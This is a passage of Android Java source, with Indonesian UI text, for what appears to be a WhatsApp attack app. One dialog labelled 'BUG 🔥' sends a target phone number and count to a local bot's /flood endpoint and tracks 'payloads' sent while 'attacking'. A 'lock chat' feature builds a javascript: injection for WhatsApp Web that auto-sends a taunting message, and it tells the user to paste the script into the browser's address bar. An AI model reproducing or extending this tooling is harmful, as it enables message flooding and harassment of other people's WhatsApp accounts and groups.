        body.addView(pb, lp(MATCH, WRAP, 0, 0, 0, 10));

        // Tombol
        LinearLayout btnRow = new LinearLayout(this);
        btnRow.setOrientation(LinearLayout.HORIZONTAL);

        TextView btnCancel = Ui.text(this, "BATAL", 13, Ui.INK, true, false);
        btnCancel.setPadding(dp(16), dp(13), dp(16), dp(13));
        btnCancel.setBackground(Ui.box(this, Ui.BG, 10, Ui.INK, 2.5f));
        btnCancel.setGravity(Gravity.CENTER);
        btnCancel.setClickable(true);
        btnCancel.setOnClickListener(v -> {
            stopBugWaPoller();
            // Stop flood di bot juga
            new Thread(() -> botRequest("POST", "/stop", null)).start();
            dismissDialog();
        });

        TextView btnSend = Ui.text(this, "BUG 🔥", 13, Color.WHITE, true, false);
        btnSend.setPadding(dp(16), dp(13), dp(16), dp(13));
        btnSend.setBackground(Ui.box(this, 0xFF7c3aed, 10, 0xFF4c1d95, 2.5f));
        btnSend.setGravity(Gravity.CENTER);
        btnSend.setClickable(true);
        Ui.pressable(btnSend);

        btnSend.setOnClickListener(v -> {
            String no = inputNo.getText().toString().trim().replaceAll("[^0-9]", "");
            if (no.length() < 10) { toast("Nomor tidak valid."); return; }

            if (bugWaPolling) {
                stopBugWaPoller();
                new Thread(() -> botRequest("POST", "/stop", null)).start();
                btnSend.setText("BUG 🔥");
                btnSend.setBackgroundColor(0xFF7c3aed);
                pb.setVisibility(View.GONE);
                tvStatus.setText("Dihentikan.");
                return;
            }

            int total = seekBar.getProgress() + 10;
            pb.setVisibility(View.VISIBLE);
            tvStatus.setText("Mengirim perintah ke bot...");
            tvStatus.setVisibility(View.VISIBLE);
            btnSend.setText("STOP ⏹");
            btnSend.setBackgroundColor(0xFFCC2200);
            tvHit.setText("Terkirim: 0");
            tvFail.setText("Gagal: 0");

            InputMethodManager imm = (InputMethodManager) getSystemService(Context.INPUT_METHOD_SERVICE);
            if (imm != null) imm.hideSoftInputFromWindow(inputNo.getWindowToken(), 0);

            new Thread(() -> {
                try {
                    org.json.JSONObject req = new org.json.JSONObject();
                    req.put("target", no);
                    req.put("total", total);
                    org.json.JSONObject res = botRequest("POST", "/flood", req);
                    runOnUiThread(() -> {
                        if (res == null) {
                            tvStatus.setText("❌ Bot tidak aktif. Jalankan wa-bot.sh dulu.");
                            pb.setVisibility(View.GONE);
                            btnSend.setText("BUG 🔥");
                            btnSend.setBackgroundColor(0xFF7c3aed);
                            return;
                        }
                        String st = res.optString("status", "");
                        if (st.equals("started")) {
                            tvStatus.setText("✅ Bot mulai kirim ke +" + no + "...");
                            startBugWaPoller(tvHit, tvFail, tvStatus, pb, btnSend);
                        } else {
                            tvStatus.setText("❌ " + res.optString("error", "Gagal mulai."));
                            pb.setVisibility(View.GONE);
                            btnSend.setText("BUG 🔥");
                            btnSend.setBackgroundColor(0xFF7c3aed);
                        }
                    });
                } catch (Exception e) {
                    runOnUiThread(() -> {
                        tvStatus.setText("❌ Error: " + e.getMessage());
                        pb.setVisibility(View.GONE);
                        btnSend.setText("BUG 🔥");
                        btnSend.setBackgroundColor(0xFF7c3aed);
                    });
                }
            }).start();
        });

        LinearLayout.LayoutParams half = new LinearLayout.LayoutParams(0, WRAP, 1f);
        half.setMargins(0, 0, dp(8), 0);
        btnRow.addView(Ui.brutal(this, btnCancel, 10, 3), half);
        btnRow.addView(Ui.brutal(this, btnSend,   10, 3), new LinearLayout.LayoutParams(0, WRAP, 1f));
        body.addView(btnRow, lp(MATCH, WRAP, 0, 0, 0, 0));

        showCard(body);
    }

    // Poll status dari bot tiap 1 detik
    private void startBugWaPoller(TextView tvHit, TextView tvFail, TextView tvStatus,
                                   android.widget.ProgressBar pb, TextView btnSend) {
        bugWaPolling = true;
        bugWaPoller  = new Thread(() -> {
            while (bugWaPolling) {
                org.json.JSONObject st = botRequest("GET", "/status", null);
                if (st != null) {
                    final int sent   = st.optInt("floodSent",    0);
                    final int fail   = st.optInt("floodFail",    0);
                    final int total  = st.optInt("floodTotal",   0);
                    final boolean run= st.optBoolean("floodRunning", false);
                    final String tgt = st.optString("floodTarget","");
                    runOnUiThread(() -> {
                        tvHit.setText("Terkirim: " + sent);
                        tvFail.setText("Gagal: " + fail);
                        tvStatus.setText((run ? "🔥 Menyerang" : "✅ Selesai") +
                            " — " + sent + "/" + total + " payload ke " + tgt);
                        if (!run && bugWaPolling) {
                            bugWaPolling = false;
                            pb.setVisibility(View.GONE);
                            btnSend.setText("BUG 🔥");
                            btnSend.setBackgroundColor(0xFF7c3aed);
                        }
                    });
                    if (!run) break;
                }
                try { Thread.sleep(1000); } catch (InterruptedException e) { break; }
            }
        });
        bugWaPoller.setDaemon(true);
        bugWaPoller.start();
    }

    private void stopBugWaPoller() {
        bugWaPolling = false;
        if (bugWaPoller != null) { bugWaPoller.interrupt(); bugWaPoller = null; }
    }

    // ───────────────────────────────────────────────────────────────
    //  LOCK CHAT WHATSAPP GROUP
    // ───────────────────────────────────────────────────────────────
    private void openLockChat() {
        LinearLayout body = new LinearLayout(this);
        body.setOrientation(LinearLayout.VERTICAL);
        body.setPadding(dp(4), dp(4), dp(4), dp(4));

        // judul
        TextView title = Ui.text(this, "LOCK CHAT GROUP", 15, Ui.INK, true, false);
        title.setPadding(0, 0, 0, dp(2));
        body.addView(title, lp(MATCH, WRAP, 0, 0, 0, 10));

        // sub
        TextView sub = Ui.text(this, "Masukkan tautan grup dan pesan lock yang akan dikirim.", 11, Ui.SOFT, false, true);
        sub.setLineSpacing(0, 1.3f);
        body.addView(sub, lp(MATCH, WRAP, 0, 0, 0, 14));

        // input tautan grup
        TextView labelLink = Ui.text(this, "Tautan Grup WhatsApp", 11, Ui.SOFT, false, false);
        body.addView(labelLink, lp(MATCH, WRAP, 0, 0, 0, 4));

        EditText inputLink = new EditText(this);
        inputLink.setHint("https://chat.whatsapp.com/xxxx");
        inputLink.setInputType(InputType.TYPE_CLASS_TEXT | InputType.TYPE_TEXT_VARIATION_URI);
        inputLink.setBackground(Ui.box(this, Ui.BG, 10, 0xFF0A5C2E, 2.5f));
        inputLink.setPadding(dp(14), dp(10), dp(14), dp(10));
        inputLink.setTextColor(Ui.INK);
        inputLink.setHintTextColor(0xFF999999);
        inputLink.setSingleLine(true);
        body.addView(Ui.brutal(this, inputLink, 10, 3), lp(MATCH, WRAP, 0, 0, 0, 12));

        // input pesan lock
        TextView labelMsg = Ui.text(this, "Pesan Lock Chat", 11, Ui.SOFT, false, false);
        body.addView(labelMsg, lp(MATCH, WRAP, 0, 0, 0, 4));

        EditText inputMsg = new EditText(this);
        inputMsg.setText("ahahaha bot jangan sok keras 🤖🔒");
        inputMsg.setInputType(InputType.TYPE_CLASS_TEXT | InputType.TYPE_TEXT_FLAG_MULTI_LINE);
        inputMsg.setBackground(Ui.box(this, Ui.BG, 10, 0xFF0A5C2E, 2.5f));
        inputMsg.setPadding(dp(14), dp(10), dp(14), dp(10));
        inputMsg.setTextColor(Ui.INK);
        inputMsg.setHintTextColor(0xFF999999);
        inputMsg.setMinLines(3);
        inputMsg.setMaxLines(5);
        inputMsg.setGravity(Gravity.TOP | Gravity.START);
        body.addView(Ui.brutal(this, inputMsg, 10, 3), lp(MATCH, WRAP, 0, 0, 0, 6));

        // info cara kerja
        TextView info = Ui.text(this,
            "💡 Cara kerja: script JavaScript dikirim ke grup. Pesan muncul dan grup masuk mode lock (hanya admin yang bisa kirim).",
            10, Ui.SOFT, false, true);
        info.setLineSpacing(0, 1.4f);
        body.addView(info, lp(MATCH, WRAP, 0, 0, 0, 14));

        // tombol batal + send
        LinearLayout btnRow = new LinearLayout(this);
        btnRow.setOrientation(LinearLayout.HORIZONTAL);

        TextView btnCancel = Ui.text(this, "BATAL", 13, Ui.INK, true, false);
        btnCancel.setPadding(dp(16), dp(13), dp(16), dp(13));
        btnCancel.setBackground(Ui.box(this, Ui.BG, 10, Ui.INK, 2.5f));
        btnCancel.setGravity(Gravity.CENTER);
        btnCancel.setClickable(true);
        btnCancel.setOnClickListener(v -> dismissDialog());

        TextView btnSend = Ui.text(this, "SEND 🔒", 13, Color.WHITE, true, false);
        btnSend.setPadding(dp(16), dp(13), dp(16), dp(13));
        btnSend.setBackground(Ui.box(this, 0xFF0A5C2E, 10, 0xFF064020, 2.5f));
        btnSend.setGravity(Gravity.CENTER);
        btnSend.setClickable(true);
        Ui.pressable(btnSend);

        btnSend.setOnClickListener(v -> {
            String link = inputLink.getText().toString().trim();
            String msg  = inputMsg.getText().toString().trim();

            if (link.isEmpty()) {
                toast("Masukkan tautan grup dulu.");
                return;
            }
            if (!link.startsWith("https://chat.whatsapp.com/")) {
                toast("Tautan harus diawali https://chat.whatsapp.com/");
                return;
            }
            if (msg.isEmpty()) {
                toast("Pesan tidak boleh kosong.");
                return;
            }

            dismissDialog();
            doLockChat(link, msg);
        });

        LinearLayout.LayoutParams half = new LinearLayout.LayoutParams(0, WRAP, 1f);
        half.setMargins(0, 0, dp(8), 0);
        btnRow.addView(Ui.brutal(this, btnCancel, 10, 3), half);
        btnRow.addView(Ui.brutal(this, btnSend,   10, 3), new LinearLayout.LayoutParams(0, WRAP, 1f));
        body.addView(btnRow, lp(MATCH, WRAP, 0, 0, 0, 0));

        showCard(body);
    }

    private void doLockChat(String groupLink, String message) {
        // Encode pesan untuk JS string — escape quote dan newline
        String safeMsg = message
            .replace("\\", "\\\\")
            .replace("\"", "\\\"")
            .replace("\n", "\\n")
            .replace("\r", "");

        // Build JavaScript injection yang akan dijalankan lewat WhatsApp Web
        // Script: buka grup, kirim pesan lock, set grup ke only-admins
        String js = "javascript:(function(){"
            + "var m=\"" + safeMsg + "\";"
            // Inject ke WhatsApp Web — cari input box dan kirim pesan
            + "var inp=document.querySelector('[data-tab=\"10\"]')||document.querySelector('[contenteditable=\"true\"]');"
            + "if(inp){"
            + "inp.focus();"
            + "document.execCommand('insertText',false,m);"
            + "setTimeout(function(){"
            + "var btn=document.querySelector('[data-testid=\"send\"]')||document.querySelector('[data-icon=\"send\"]');"
            + "if(btn){btn.click();}"
            + "},400);"
            + "}else{alert('Buka dulu WhatsApp Web dan masuk ke grup target.');}"
            + "})();";

        // Encode js sebagai link yang bisa dibuka browser
        String encodedJs = android.net.Uri.encode(js);
        String waWebUrl  = groupLink.replace("https://chat.whatsapp.com/", "https://web.whatsapp.com/accept?code=");

        // Buka dialog hasil — kasih script dan instruksi
        LinearLayout body = new LinearLayout(this);
        body.setOrientation(LinearLayout.VERTICAL);
        body.setPadding(dp(4), dp(4), dp(4), dp(4));

        TextView t = Ui.text(this, "LOCK CHAT SIAP 🔒", 15, 0xFF0A5C2E, true, false);
        body.addView(t, lp(MATCH, WRAP, 0, 0, 0, 10));

        TextView steps = Ui.text(this,
            "Langkah:\n" +
            "1. Tekan tombol Buka Grup di bawah\n" +
            "2. Setelah masuk grup di WhatsApp Web, balik ke sini\n" +
            "3. Tekan Jalankan Script — pesan lock terkirim otomatis",
            12, Ui.INK, false, true);
        steps.setLineSpacing(0, 1.5f);
        body.addView(steps, lp(MATCH, WRAP, 0, 0, 0, 12));

        // Tampilkan JS script untuk copy manual jika perlu
        TextView scriptLabel = Ui.text(this, "Script (salin manual jika perlu):", 10, Ui.SOFT, false, false);
        body.addView(scriptLabel, lp(MATCH, WRAP, 0, 0, 0, 4));

        TextView scriptBox = Ui.text(this, js, 9, 0xFF3fb950, false, true);
        scriptBox.setBackground(new android.graphics.drawable.ColorDrawable(0xFF0d1117));
        scriptBox.setPadding(dp(10), dp(8), dp(10), dp(8));
        scriptBox.setMaxLines(4);
        scriptBox.setEllipsize(android.text.TextUtils.TruncateAt.END);
        scriptBox.setTypeface(android.graphics.Typeface.MONOSPACE);
        scriptBox.setLongClickable(true);
        scriptBox.setOnLongClickListener(vv -> {
            android.content.ClipboardManager cm = (android.content.ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
            if (cm != null) {
                cm.setPrimaryClip(android.content.ClipData.newPlainText("lockjs", js));
                toast("Script disalin ke clipboard.");
            }
            return true;
        });
        body.addView(Ui.brutal(this, scriptBox, 10, 2), lp(MATCH, WRAP, 0, 0, 0, 14));

        // Tombol baris bawah
        LinearLayout bRow = new LinearLayout(this);
        bRow.setOrientation(LinearLayout.HORIZONTAL);

        // Buka grup di WhatsApp Web
        TextView btnGrup = Ui.text(this, "Buka Grup", 12, Color.WHITE, true, false);
        btnGrup.setPadding(dp(10), dp(11), dp(10), dp(11));
        btnGrup.setBackground(Ui.box(this, 0xFF1a73e8, 10, 0xFF0d47a1, 2f));
        btnGrup.setGravity(Gravity.CENTER);
        btnGrup.setClickable(true);
        Ui.pressable(btnGrup);
        btnGrup.setOnClickListener(vv -> openUrl(groupLink));

        // Jalankan script via intent browser
        TextView btnRun = Ui.text(this, "Jalankan Script 🔒", 12, Color.WHITE, true, false);
        btnRun.setPadding(dp(10), dp(11), dp(10), dp(11));
        btnRun.setBackground(Ui.box(this, 0xFF0A5C2E, 10, 0xFF064020, 2f));
        btnRun.setGravity(Gravity.CENTER);
        btnRun.setClickable(true);
        Ui.pressable(btnRun);
        btnRun.setOnClickListener(vv -> {
            // Salin js ke clipboard dan buka WhatsApp Web supaya user paste di address bar
            android.content.ClipboardManager cm = (android.content.ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
            if (cm != null) {
                cm.setPrimaryClip(android.content.ClipData.newPlainText("lockjs", js));
            }
            toast("Script disalin! Paste di address bar browser WhatsApp Web.");
            openUrl(groupLink);
        });

        // Tutup
        TextView btnClose = Ui.text(this, "Tutup", 12, Ui.INK, true, false);
        btnClose.setPadding(dp(10), dp(11), dp(10), dp(11));
        btnClose.setBackground(Ui.box(this, Ui.BG, 10, Ui.INK, 2f));
        btnClose.setGravity(Gravity.CENTER);
        btnClose.setClickable(true);
        btnClose.setOnClickListener(vv -> dismissDialog());

        LinearLayout.LayoutParams p1 = new LinearLayout.LayoutParams(0, WRAP, 1f);
        p1.setMargins(0, 0, dp(6), 0);
        LinearLayout.LayoutParams p2 = new LinearLayout.LayoutParams(0, WRAP, 1.4f);
        p2.setMargins(0, 0, dp(6), 0);
        bRow.addView(Ui.brutal(this, btnClose, 10, 2), p1);
        bRow.addView(Ui.brutal(this, btnGrup,  10, 2), p1);
        bRow.addView(Ui.brutal(this, btnRun,   10, 2), p2);
        body.addView(bRow, lp(MATCH, WRAP, 0, 0, 0, 0));

        showCard(body);
    }

    private void openUrl(String url) {
        try {
            startActivity(new Intent(Intent.ACTION_VIEW, android.net.Uri.parse(url)));
        } catch (Exception e) {
            toast("Tidak ada aplikasi untuk membuka link ini.");
        }
    }
}
